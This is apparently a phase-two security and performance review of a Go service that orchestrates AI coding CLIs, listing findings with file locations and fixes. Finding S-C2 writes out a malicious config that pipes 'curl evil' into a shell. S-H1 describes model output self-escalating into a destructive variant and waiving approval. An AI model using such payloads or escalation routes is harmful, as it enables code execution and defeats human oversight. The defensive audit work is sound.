# Phase 2: Security & Performance Review

Full raw findings: `raw-2a-security.md` (Step 2A) and `raw-2b-performance.md` (Step 2B).

Combined totals — Security: **2 Critical, 4 High, 5 Medium, 4 Low** (`govulncheck` clean, CI well-hardened). Performance: **1 Critical, 6 High, 7 Medium, 5 Low**. Both reviews independently converged on the durable-write silent-failure defect (also flagged in Phase 1).

## Security Findings

### Critical
- **S-C1 — Durable service spawns confirmation-gated destructive variants with no gate/cap/confirmation** (CWE-862/306, ~CVSS 8.6). `internal/runtime/service.go:824-832` (`chooseProfile`), `421-448` (`dispatchOnce`), `680-686` (`variantAllowed` returns `DurableAllowed`, true for savage/world-breaker/old-man). The durable path never consults `HasGate`/`ConfirmationGate`/`RequireSpendCap`; the `--confirm-*` flags exist only on `RunCmd`. A landed/imported plan setting `primary_variant: "world-breaker"` runs the destructive persona with the provider sandbox bypassed. *(= Phase-1 A-C1.)*
- **S-C2 — Committed `config.toml` fully controls the executed provider binary and argv** (CWE-829/94, ~CVSS 8.4). `internal/config/config.go` `Load` reads the committed config; `provider.ResolveBinding` passes `Binary`/`Type`/`Args` straight to `exec.CommandContext` with no allowlist. A malicious PR setting `binary="/bin/sh" args=["-c","curl evil|sh"]` executes on the next tick — bypassing the scrutiny a `.go` change would attract.

### High
- **S-H1 — Malicious AI output can drive privileged state transitions / self-escalate** (CWE-807, ~CVSS 7.1). `runtime/result.go` + `service.go:495-590`: model-supplied `handoff_to` becomes the next task's `VariantHint` → `chooseProfile`; combined with S-C1, `{"outcome":"handoff","handoff_to":"world-breaker"}` self-escalates. `approval_required:false` from the model is trusted. Validate `handoff_to` against a policy allowlist; never let model output pick a gated variant or waive approval.
- **S-H2 — Unbounded IPC request frame (memory-exhaustion DoS)** (CWE-770, ~CVSS 5.5, same-user). `internal/ipc/server.go:189-193` `bufio.ReadBytes('\n')` buffers unboundedly; no read deadline (slow-loris). Wrap in `io.LimitReader` (~1MB) + `SetReadDeadline`.
- **S-H3 — No IPC protocol versioning; `enqueue` writes a dead table; malformed args default silently.** A malformed `StopArgs` becomes a valid non-graceful stop. *(= Phase-1 A-H2/A-H3.)* Add a `version` field; remove/wire `HandleEnqueue`; error on empty args for state-changing commands.
- **S-H4 — Durable SQLite state writes silently discarded on error** (CWE-252). *(= Phase-1 Q-C1 and Perf P-C1 — consolidated in the final report.)*

### Medium
- **S-M1 —** Provider CLIs run with sandbox/approval disabled (codex `--dangerously-bypass-approvals-and-sandbox`, gemini `--approval-mode yolo`, claude broad allowlist); intended, but any escalation → unsandboxed execution. Reachable only after the S-C1 gate; consider per-variant sandbox tiers.
- **S-M2 —** `plan import` reads an arbitrary path and inserts `primary_variant`/`variant_hint`/`depends_on` with no validation — the injection vector for S-C1. Validate variants at import; reject gated variants unless confirmed; validate the DAG.
- **S-M3 —** `file://` mirror URL by string concat (`workspace/git.go:15`); not currently exploitable (argv, no shell) but no `--` separator on clone/worktree positionals. Validate `repoPath`; add `--`.
- **S-M4 —** World-readable config/state (`0o644`/`0o750`, `initcmd/write.go`); `local.toml` (holds `provider_binary`) world-readable. Write `local.toml` `0o600`; state dir `0o700`.
- **S-M5 —** `renderArgTemplate` injects prompt content into argv positions (CWE-88, `declarative.go:236`); argv (not shell) injection, but a `-`-leading value in a bare slot parses as a flag. Place after `--` or validate.

### Low
- **S-L1 —** Lenient first-`{`-to-last-`}` JSON slicing (`provider/exec.go`, `runtime/result.go`); `DisallowUnknownFields` limits impact.
- **S-L2 —** PID file trust — `stop`/status rely on heartbeat mtime, not PID identity (stale reused PID undetected).
- **S-L3 —** Error messages leak full argv + stderr (may surface prompt contents into the event log); scrub prompt tokens.
- **S-L4 —** No Unix-socket peer credential check (`SO_PEERCRED`); any same-user process can drive the service. Acceptable for the threat model; document it.

## Performance Findings

### Critical
- **P-C1 — Durable-state writes silently discarded under contention** (`service.go:398-566`). `plans.db` is written cross-process; all plandag txns are **deferred**, so a SELECT-then-UPDATE racing another commit gets `SQLITE_BUSY_SNAPSHOT` which `busy_timeout` does **not** retry — it fails immediately and the error is dropped. Root cause of the silent-orphan defect (= Q-C1 / S-H4). Fix: `_txlock=immediate` DSN + retry-and-log.

### High
- **P-H1 — Event log unbounded; every attach client replays full history.** `lastID` starts at 0; no retention/`DELETE`. Start at `MAX(id)`/cursor; add retention; move to a broadcast channel.
- **P-H2 — Git clone/fetch/worktree run synchronously on the scheduler goroutine** (`service.go:453-457`); a multi-GB repo blocks scheduling for minutes. Move acquisition into the worker goroutine; cache `Reconcile`.
- **P-H3 — Heartbeat/reclaim half-built:** heartbeats fire every 1s (`TickInterval`, not `HeartbeatInterval`); **no reaper** consumes `last_heartbeat`; crash → permanent session/task leaks (~86k write txns/day/idle service). Separate ticker; build the reaper; batch heartbeats.
- **P-H4 — Data race on `Service.cfg`/`Service.local`** (`service.go:496-497` unlocked read vs `reloadConfig` write); `config.File` holds maps → torn read/crash. Snapshot under mutex / `atomic.Pointer`; `go test -race`.
- **P-H5 — Fixit doc scan walks the whole tree unbounded** (`explore.go:123-148`), no skip list (unlike `countLangs`), double-walks `docs/`, reads every `.md` fully. Reuse the skip set; depth-limit; read frontmatter head only.
- **P-H6 — TUI reopens + re-migrates the store every 2s with N+1 queries** (`tui.go:953-968`); store open/migrate ~43k×/day plus per-task `TaskDeps`/per-plan `Ready`. Open once; bulk-query deps.

### Medium
- **P-M1 — `ClaimNextReady` not atomic across processes → task double-claim** (`task.go:219-287`): deferred tx, no `RowsAffected` check; a lost race still commits and returns the task, so two workers run it. **Correctness bug** — `_txlock=immediate` + verify `RowsAffected`.
- **P-M2 —** `synchronous` pragma effectively unset (schema pragma only hits the migration conn); steady-state runs at `FULL`, fsyncing ~1-2×/sec forever. Append `&_pragma=synchronous(NORMAL)` to all three DSNs.
- **P-M3 —** No per-task subprocess timeout (`service.go:520`); a hung CLI starves the variant permanently. `context.WithTimeout` + fail-retryable.
- **P-M4 —** IPC accept loop `return`s on the first transient accept error (`server.go:160-177`), silently killing status/attach/stop. `continue` with backoff.
- **P-M5 —** Attach streaming has no write deadline (`server.go:242-249`); a stalled client pins the WAL and leaks the goroutine. `SetWriteDeadline`; optionally buffer the batch.
- **P-M6 —** Redundant `AttachPlan` write every 1s tick per plan (`service.go:415`). Track attached IDs in a map.
- **P-M7 — TUI "mark done" claims an arbitrary task, not the selected one** (`tui.go:1350`), leaving the wrong task `running` under a never-heartbeating operator session. **Correctness bug** — use `OperatorMarkDone`.

### Low
- **P-L1 —** `wouldCreateCycle` recursive N+1 (`task.go:144-183`); use a recursive CTE.
- **P-L2 —** Scheduler scans all repos' plans every tick; add `WHERE repo_path = ?`.
- **P-L3 —** Provider raw stream fully buffered in memory (`declarative.go:275-312`); use a bounded ring.
- **P-L4 —** Mirror never fetched after initial clone (`Manager.Fetch` has zero callers) → stale worktrees, merge-conflict churn. Wire rate-limited `Fetch` off the scheduler goroutine.
- **P-L5 —** `reloadConfig` holds `s.mu` across a `logEvent` insert (up to 5s stall), pausing dispatch. Reorder after `Unlock`.

## Convergence note

Three independent reviewers flagged the same durable-write silent-failure (Q-C1 / S-H4 / P-C1). The performance review supplies the root cause: **deferred SQLite transactions on a cross-process-shared `plans.db` + `busy_timeout` not covering `BUSY_SNAPSHOT` + discarded errors.** The correct fix is layered: `_txlock=immediate` DSN (serializes writers so busy_timeout applies), `RowsAffected` checks on claim/transition (P-M1), and retry-and-log instead of `_ =` (Q-C1). This is the single highest-leverage change in the codebase and also underpins security S-H4's integrity/audit gap.

## Critical Issues for Phase 3 Context

1. **Test coverage gap on the durable path:** the gate-bypass (S-C1/A-C1), unenforced spend cap (A-C2), silent write failure (P-C1/Q-C1), data race (P-H4), and double-claim (P-M1) are all on the durable `service`/`plandag` write path. Phase 3 must assess whether any test exercises `dispatchOnce`→gate enforcement, concurrent cross-process claims (`-race`), or busy-write retry — these are the highest-risk untested paths.
2. **No reaper = no test for reclaim:** `reclaim_count` and heartbeat staleness (P-H3) have schema support but no implementation and presumably no test.
3. **Documentation drift to verify:** the advertised MCP tool surface doesn't exist (A-M2); `ClaimNextReady`'s doc comment claims BEGIN IMMEDIATE but the code is deferred (P-M1); the schema `synchronous` pragma comment is misleading (P-M2); `Reconcile`'s doc says "called at runtime boot" but it runs every dispatch (P-H2). Phase 3 doc review should catch code/doc contradictions like these.
